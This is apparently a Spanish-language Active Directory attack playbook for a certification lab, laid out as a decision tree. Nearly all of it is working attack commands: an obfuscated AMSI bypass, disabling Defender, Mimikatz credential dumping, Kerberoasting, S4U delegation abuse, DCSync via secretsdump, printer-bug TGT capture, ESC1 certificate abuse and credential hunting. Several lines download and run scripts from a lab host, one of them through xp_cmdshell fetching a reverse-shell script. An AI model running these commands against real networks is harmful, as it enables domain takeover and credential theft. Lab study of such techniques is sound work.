
```PowerShell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```PowerShell
SeT-Item ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varIABLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."AssEmbly"."GETTYPe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."getfiElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sETVaLUE"(  ${nULl},${tRuE} )
```

```PowerShell
. C:\AD\tools\PowerView.ps1 
```



TIENES LOCAL ADMIN?  
├─ NO → PowerUp → VDS exploit → Tendrás admin  
└─ SÍ → Continúa

ERES DE DOMINIO?  
├─ SÍ → Continúa  
└─ NO → Problema, busca credenciales dominio

ENUMERA DOMINIO CON POWERVIEW + BLOODHOUND  
├─ ¿Hay Kerberoastable?  
│ ├─ SÍ → Intentar crack  
│ │ ├─ Crackea → Tienes usuario  
│ │ └─ No crackea → Continúa  
│ └─ NO → Continúa  
│  
├─ ¿Hay Constrained Delegation (T2A)?  
│ ├─ SÍ → Rubeus s4u → LATERAL MOVEMENT  
│ └─ NO → Continúa  
│  
├─ ¿Hay DCSync rights?  
│ ├─ SÍ → secretsdump → DA hashes  
│ └─ NO → Continúa  
│  
└─ ¿Hay otros vectores?  
├─ Unconstrained Delegation → Printer Bug  
├─ ACLs débiles → Modificar atributos  
├─ SQL Server → xp_cmdshell  
├─ ADCS vulnerable → ESC1  
└─ Compartidas con credenciales → Búscalas




### PASO 1: ¿TIENES LOCAL ADMIN?

#### **Opción NO: No eres admin local**

**Comando 1 - Verificar si eres admin:**

powershell

```powershell
whoami /groups | findstr /C:"S-1-5-32-544"
# ❌ Si no aparece = NO eres admin
```

**Comando 2 - Ejecutar PowerUp:**

powershell

```powershell
# En máquina víctima
IEX (New-Object Net.WebClient).DownloadString('http://172.16.99.11:8000/powershell-scripts/Invoke-AllChecks.ps1')
Invoke-AllChecks
```

**Output esperado:**

```
ServiceName            : VDS (Virtual Disk Service)
CanRestart             : True
ModifiableFile         : C:\Windows\System32\vds.exe ← CRÍTICO
```

**Comando 3 - Explotar VDS:**

powershell

```powershell
Invoke-ServiceAbuse -Name 'VDS' -UserName "DOMAIN\studentuser" -Verbose
```

**Validar que ahora eres admin:**

powershell

```powershell
net localgroup administrators
# ✅ Debe aparecer tu usuario
```

---

#### **Opción SÍ: Ya eres admin local**

**Comando - Verificar admin:**

powershell

```powershell
whoami /groups | findstr /C:"S-1-5-32-544"
# ✅ Si aparece = Eres admin
```

**→ Salta a PASO 2**

---

### 🟢 PASO 2: ¿ERES DE DOMINIO?

#### **Verificar si estás en dominio:**

powershell

```powershell
# Comando 1: Ver quién eres
whoami
# Output esperado: TECH\studentuser (NO: solo studentuser = local)

# Comando 2: Ver grupos
whoami /groups
# Busca líneas que digan TECH\ o FINANCE\ = Eres de dominio

# Comando 3: Ver dominio
$env:USERDOMAIN
# Output esperado: TECH (si es tu dominio) o FINANCE

# Comando 4: Contactar DC (verificar conectividad)
nslookup tech-dc.tech.finance.corp
# ✅ Si resuelve = Tienes conectividad
```

---

#### **Opción NO: No eres de dominio**

**El problema:** Eres admin local pero no de dominio = No puedes hacer ataques de dominio

**Soluciones en orden:**

powershell

```powershell
# Solución 1: Buscar credenciales locales/dominio en archivos
Get-ChildItem -Path "C:\Users" -Recurse -Include "*.txt","*.ps1","*.conf" -ErrorAction SilentlyContinue | Select-String -Pattern "password|username|credential" -ErrorAction SilentlyContinue

# Solución 2: Buscar en registro
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /s
reg query "HKCU\Software" /s | findstr /i "password"

# Solución 3: Usar Mimikatz para extraer credenciales en memoria
C:\AD\Tools\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
# Busca: Domain, NTLM hashes, o plaintext passwords

# Solución 4: Si encuentras credenciales, conectarte al dominio
$cred = New-Object System.Management.Automation.PSCredential('TECH\usuario', (ConvertTo-SecureString 'Password123' -AsPlainText -Force))
Enter-PSSession -ComputerName tech-dc -Credential $cred
```

**Si nada funciona → FALLO, intenta otro vector**

---

#### **Opción SÍ: Eres de dominio**

powershell

```powershell
# Confirmación final
Get-NetDomain
# Output: tech.finance.corp
```

**→ Salta a PASO 3**

---

### 🟠 PASO 3: ENUMERACIÓN DE DOMINIO (PowerView + BloodHound)

#### **Cargar PowerView:**

powershell

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://172.16.99.11:8000/powerview.ps1')
```

#### **Query 1: ¿Hay Kerberoastable?**

powershell

```powershell
# Comando - Buscar usuarios con SPN (Kerberoastable)
Get-DomainUser -SPN | Select-Object samaccountname, ServicePrincipalName

# Output esperado:
# samaccountname       ServicePrincipalName
# sqlserversync        MSSQLSvc/tech-sql.tech.finance.corp:1433
# techservice          HTTP/techsrv30.tech.finance.corp
# databaseagent        MSSQLSvc/dbserver31.tech.finance.corp
```

**Si SÍ hay Kerberoastable:**

powershell

```powershell
# Descargar Rubeus
(New-Object Net.WebClient).DownloadFile('http://172.16.99.11:8000/tools/Rubeus.exe', 'C:\AD\Rubeus.exe')

# Solicitar tickets
C:\AD\Rubeus.exe kerberoast /user:sqlserversync /simple /outfile:C:\AD\hashes.txt

# Intentar crack
# Copiar hash a máquina atacante
john --wordlist=rockyou.txt hashes.txt

# Si crackea → TIENES PASSWORD del usuario
# Si NO crackea → Continúa con siguiente check
```

---

#### **Query 2: ¿Hay Constrained Delegation (T2A)?**

powershell

```powershell
# Comando - Buscar máquinas con TrustedToAuth
Get-DomainComputer -TrustedToAuth | Select-Object name, msds-AllowedToDelegateTo

# Output esperado:
# name     msds-AllowedToDelegateTo
# STUDVM   {CIFS/mgmtsrv.tech.finance.corp}
# mgmtsrv  {HTTP/techsrv30.tech.finance.corp}
```

**Si SÍ hay Constrained Delegation:**

powershell

```powershell
# Paso 1: Obtener hash de máquina (de Mimikatz anterior)
# Busca en output:
# * MACHINE ACCOUNT *
#   * Username : STUDVM$
#   * NTLM : 9d1ae6a056d1366d8a905ae41504d351

# Paso 2: Forge ticket (S4U attack)
C:\AD\Rubeus.exe s4u `
  /user:STUDVM$ `
  /rc4:9d1ae6a056d1366d8a905ae41504d351 `
  /impersonateuser:Administrator `
  /msdsspn:CIFS/mgmtsrv.tech.finance.corp `
  /domain:tech.finance.corp `
  /dc:172.16.4.1 `
  /ppt

# Paso 3: Validar acceso
dir \\mgmtsrv.tech.finance.corp\c$
# ✅ Si funciona = TIENES ACCESO

# Paso 4: Conectar a máquina
winrs -r:mgmtsrv.tech.finance.corp cmd
```

---

#### **Query 3: ¿Hay DCSync rights?**

powershell

```powershell
# Comando - Buscar permisos DCSync
Get-DomainObjectAcl -SearchBase "DC=tech,DC=finance,DC=corp" -SearchScope Base -ResolveGUIDs | `
  Where-Object {($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | `
  ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}

# Output esperado (si tu usuario tiene permisos):
# IdentityName  : TECH\student97
# ObjectAceType : GetChanges-All (CRÍTICO)
```

**Si SÍ hay DCSync rights (y eres el usuario con permisos):**

powershell

```powershell
# Descarga impacket (en máquina Linux/atacante)
python3 -m pip install impacket

# DCSync attack
impacket-secretsdump -outputfile dcsync_hashes tech.finance.corp/student97:password@172.16.4.1

# Output: Archivo con TODOS los hashes del dominio
# Administrator: HASH_AQUI
# krbtgt: HASH_AQUI
```

**Si NO tienes DCSync rights (pero eres DA):**

powershell

```powershell
# Primero necesitas ser DA (usando otro método)
# Luego agregar permisos a tu usuario:

. C:\AD\Tools\PowerView.ps1

Add-DomainObjectAcl `
  -TargetIdentity 'DC=tech,DC=finance,DC=corp' `
  -PrincipalIdentity student97 `
  -Rights DCSync `
  -PrincipalDomain tech.finance.corp `
  -TargetDomain tech.finance.corp `
  -Verbose

# Ahora SÍ puedes hacer DCSync
```

---

#### **Query 4: ¿Hay otros vectores?**

Si NO hay Kerberoastable, NO hay Delegation, NO hay DCSync → Busca otros:

---

### 🔵 OTROS VECTORES

#### **Vector 1: Unconstrained Delegation**

powershell

```powershell
# Comando - Buscar máquinas sin restricción de delegación
Get-DomainComputer -Unconstrained | Select-Object name

# Output esperado:
# name
# TECH-DC
# TECH-APPSRV
```

**Si hay Unconstrained Delegation:**

powershell

```powershell
# Paso 1: Obtener admin en máquina con unconstrained delegation
# (Necesitas PowerUp o credenciales)

# Paso 2: Monitorear TGTs en esa máquina
# (Requiere Rubeus en máquina víctima)
C:\AD\Rubeus.exe monitor /interval:5 /nowrap

# Paso 3: Forzar autenticación desde DC
# (Usar MS-RPRN o PrinterBug)
C:\AD\Tools\MS-RPRN.exe \\tech-dc.tech.finance.corp \\tech-appsrv.tech.finance.corp

# Paso 4: Capturar TGT en base64
# (Rubeus lo mostrará en consola)

# Paso 5: Usar TGT
C:\AD\Rubeus.exe ppt /ticket:<BASE64_TGT>

# Paso 6: Ahora tienes TGT de DC, hacer DCSync
impacket-secretsdump tech.finance.corp/tech-dc$@tech-dc
```

---

#### **Vector 2: ACLs Débiles**

powershell

```powershell
# Comando - Buscar ACLs interesantes
Find-InterestingDomainAcl -ResolveGUIDs | Select-Object ActiveDirectoryRights, IdentityReferenceName, ObjectDN

# Output esperado:
# ActiveDirectoryRights : GenericAll
# IdentityReferenceName  : TECH\RDPUsers
# ObjectDN               : CN=Domain Admins,CN=Users,DC=tech...
```

**Si tienes GenericAll sobre DA:**

powershell

```powershell
# Opción 1: Si es sobre usuario, cambiar password
Set-DomainUserPassword -Identity 'Administrator' -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# Opción 2: Si es sobre grupo, agregarte
Add-DomainGroupMember -Identity "Domain Admins" -Members 'student97'

# Opción 3: Si es sobre máquina, hacer RBCD
Set-DomainRBCD -Identity 'tech-dc' -DelegateFrom 'student97$'
```

---

#### **Vector 3: SQL Server**

powershell

```powershell
# Comando - Enumerar SQL servers
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Output esperado:
# Instance               : TECH-SQL.tech.finance.corp
# Accessibility          : Accessible
# Sysadmin               : True (CRÍTICO)
```

**Si tienes acceso a SQL como sysadmin:**

powershell

```powershell
# Verificar xp_cmdshell
Get-SQLServerLinkCrawl -Instance tech-sql -Query "exec master..xp_cmdshell 'whoami'"

# Si funciona → RCE en SQL
Get-SQLServerLinkCrawl -Instance tech-sql `
  -Query "exec master..xp_cmdshell 'powershell.exe IEX (New-Object Net.WebClient).DownloadString(\"http://172.16.99.11:8000/rev.ps1\")'"
```

---

#### **Vector 4: ADCS (Certificate Services)**

powershell

```powershell
# Comando - Enumerar ADCS
C:\AD\Tools\Certify.exe cas

# Output esperado:
# CA Name  : moneycorp-MCORP-DC-CA
# Status   : Up

# Buscar templates vulnerables
C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
# Si HTTPSCertificates está vulnerable → ESC1
```

**Si hay ESC1:**

powershell

```powershell
# Solicitar certificado como DA
C:\AD\Tools\Certify.exe request `
  /ca:moneycorp-MCORP-DC-CA `
  /template:HTTPSCertificates `
  /altname:administrator

# Obtener TGT con certificado
C:\AD\Tools\Rubeus.exe asktgt `
  /user:administrator `
  /certificate:cert.pfx `
  /password:SecretPass@123 `
  /ppt
```

---

#### **Vector 5: Credenciales en Archivos/Shares**

powershell

```powershell
# Comando - Buscar shares accesibles
Get-DomainComputer | Select-Object -ExpandProperty dnshostname | Out-File "servers.txt"
Import-Module C:\AD\Tools\PowerHuntShares.psm1
Invoke-HuntSMBShares -HostList servers.txt

# Comando - Buscar credenciales en archivos locales
Get-ChildItem -Path "C:\Users" -Recurse -Include "*.txt","*.ps1" | Select-String "password|credential"

# Comando - Buscar en historial de PowerShell
Get-History | Select-String "password"

# Comando - Buscar en registry
reg query "HKCU\Software" /s | findstr /i "password"
```

**Si encuentras credenciales:**

powershell

```powershell
# Probar con esas credenciales
$cred = New-Object System.Management.Automation.PSCredential('TECH\usuario', (ConvertTo-SecureString 'Password123!' -AsPlainText -Force))

# Conectar a máquina
Enter-PSSession -ComputerName target-machine -Credential $cred

# O hacer Pass-the-Hash
C:\AD\Tools\Rubeus.exe asktgt /user:usuario /rc4:HASH /ppt
```

---

### 🎯 ÁRBOL EJECUTABLE RÁPIDO

powershell

```powershell
# ═══════════════════════════════════════════════════════════════
# PASO 1: ¿ADMIN LOCAL?
# ═══════════════════════════════════════════════════════════════

whoami /groups | findstr /C:"S-1-5-32-544"
# ❌ NO → Invoke-AllChecks → VDS exploit
# ✅ SÍ → Continúa

# ═══════════════════════════════════════════════════════════════
# PASO 2: ¿DOMINIO?
# ═══════════════════════════════════════════════════════════════

whoami  # Debe decir TECH\usuario
# ❌ NO → Buscar credenciales (mimikatz, archivos, registry)
# ✅ SÍ → Continúa

# ═══════════════════════════════════════════════════════════════
# PASO 3: ENUMERAR
# ═══════════════════════════════════════════════════════════════

# Cargar PowerView
IEX (New-Object Net.WebClient).DownloadString('http://172.16.99.11:8000/powerview.ps1')

# Check 1: Kerberoastable
Get-DomainUser -SPN | Select-Object samaccountname
# SÍ → Rubeus kerberoast → Crack
# NO → Continúa

# Check 2: Constrained Delegation
Get-DomainComputer -TrustedToAuth | Select-Object name, msds-AllowedToDelegateTo
# SÍ → Rubeus s4u → Lateral movement
# NO → Continúa

# Check 3: DCSync rights
Get-DomainObjectAcl -SearchBase "DC=tech,DC=finance,DC=corp" -SearchScope Base | Where-Object {$_.ActiveDirectoryRights -match 'GetChanges'}
# SÍ → impacket-secretsdump → DA hashes
# NO → Continúa

# Check 4: Otros vectores
Get-DomainComputer -Unconstrained  # Unconstrained Delegation
Find-InterestingDomainAcl          # ACLs débiles
Get-SQLInstanceDomain              # SQL Servers
C:\AD\Tools\Certify.exe cas        # ADCS vulnerable
```

---

### ✅ FLUJO COMPLETO EN 5 MINUTOS

powershell

```powershell
# 1. Minimizar evasión
Set-MpPreference -DisableRealTimeMonitoring $true

# 2. Admin local?
net localgroup administrators
# Si no → PowerUp + VDS

# 3. Dominio?
whoami
# Si no → Buscar credenciales

# 4. Enum rápido
IEX (New-Object Net.WebClient).DownloadString('http://172.16.99.11:8000/powerview.ps1')

Get-DomainUser -SPN | Select-Object samaccountname  # Kerberoastable?
Get-DomainComputer -TrustedToAuth                   # Delegation?
Get-DomainObjectAcl -SearchBase "DC=tech,DC=finance,DC=corp" -SearchScope Base | Where-Object {$_.ActiveDirectoryRights -match 'GetChanges'}  # DCSync?

# 5. Decidir vector
# Kerberoastable → Rubeus kerberoast
# Delegation → Rubeus s4u
# DCSync → impacket-secretsdump
# Nada → BloodHound o buscar compartidas
```